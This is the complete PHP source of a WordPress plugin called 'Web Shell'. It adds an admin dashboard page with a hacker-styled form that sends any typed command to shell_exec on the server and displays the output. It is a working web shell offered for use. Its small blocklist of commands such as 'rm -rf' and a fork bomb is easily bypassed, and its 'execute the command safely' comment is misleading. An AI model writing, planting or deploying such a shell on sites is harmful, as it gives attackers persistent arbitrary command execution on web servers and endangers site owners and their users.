<?php
/**
 * Plugin Name: Web Shell
 * Description: A plugin that provides web shell functionality with a hacker-style GUI for executing commands.
 * Version: 1.0
 * Author: 4m3rr0r
 */

if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly
}

// Add menu to the WordPress dashboard
function web_shell_plugin_menu() {
    add_menu_page(
        'Web Shell', // Page Title
        'Web Shell', // Menu Title
        'manage_options', // Capability
        'web-shell', // Menu Slug
        'web_shell_settings_page', // Function to display the settings page
        'dashicons-terminal' // Icon
    );
}
add_action('admin_menu', 'web_shell_plugin_menu');

// Settings page for web shell interface
function web_shell_settings_page() {
    $command_output = '';
    if (isset($_POST['ws_execute']) && isset($_POST['ws_command'])) {
        $command = sanitize_text_field($_POST['ws_command']);
        if (!empty($command)) {
            // Execute the command and capture output
            $command_output = web_shell_execute($command);
        }
    }
    ?>
    <div class="wrap">
        <h1>Web Shell Interface</h1>
        <form method="post" action="">
            <div class="ws-form-group">
                <label for="ws_command">Enter Command:</label>
                <input type="text" name="ws_command" id="ws_command" placeholder="e.g., whoami" />
            </div>
            <div class="ws-form-group">
                <input type="submit" name="ws_execute" value="Execute" class="button button-primary" />
            </div>
        </form>
        <?php if (!empty($command_output)): ?>
            <div class="ws-output">
                <h2>Command Output:</h2>
                <pre><?php echo esc_html($command_output); ?></pre>
            </div>
        <?php endif; ?>
    </div>

    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: "Courier New", Courier, monospace;
        }
        .wrap {
            border: 2px solid #0f0;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px #0f0;
        }
        h1 {
            text-align: center;
            color: #0f0;
            text-shadow: 0 0 10px #0f0;
        }
        .ws-form-group {
            margin-bottom: 15px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .ws-form-group label {
            font-weight: bold;
            margin-bottom: 5px;
            font-size: 1.2em;
            text-shadow: 0 0 5px #0f0;
        }
        .ws-form-group input[type="text"] {
            padding: 10px;
            background-color: #222;
            color: #0f0;
            border: 2px solid #0f0;
            border-radius: 5px;
            width: 60%;
            text-align: center;
            box-shadow: 0 0 10px #0f0;
        }
        .ws-form-group input[type="text"]:focus {
            outline: none;
            box-shadow: 0 0 20px #0f0;
        }
        .ws-form-group input[type="submit"] {
            width: auto;
            cursor: pointer;
            font-size: 1.1em;
            transition: background-color 0.3s;
            background-color: green;
            color: #fff;
        }
        .ws-form-group input[type="submit"]:hover {
            background-color: darkgreen;
            color: #fff;
        }
        .ws-output {
            margin-top: 20px;
            padding: 15px;
            background-color: #111;
            border: 1px solid #0f0;
            border-radius: 5px;
            box-shadow: 0 0 10px #0f0;
        }
        .ws-output h2 {
            color: #0f0;
            text-shadow: 0 0 5px #0f0;
        }
        .ws-output pre {
            color: #0f0;
            background-color: #222;
            padding: 10px;
            border-radius: 5px;
        }
    </style>
    <?php
}

// Web shell command execution function
function web_shell_execute($command) {
    // Restrict dangerous commands for safety
    $blacklist = ['rm -rf', 'shutdown', 'reboot', ':(){ :|: & };:'];
    foreach ($blacklist as $blocked) {
        if (stripos($command, $blocked) !== false) {
            return 'Error: Command blocked for security reasons.';
        }
    }

    // Execute the command safely
    $output = shell_exec($command . ' 2>&1');
    return $output ?: 'No output from command.';
}

// Plugin activation hook
function web_shell_plugin_activation() {
    // No specific options needed for web shell
}
register_activation_hook(__FILE__, 'web_shell_plugin_activation');

// Plugin deactivation hook
function web_shell_plugin_deactivation() {
    // No options to delete
}
register_deactivation_hook(__FILE__, 'web_shell_plugin_deactivation');
?>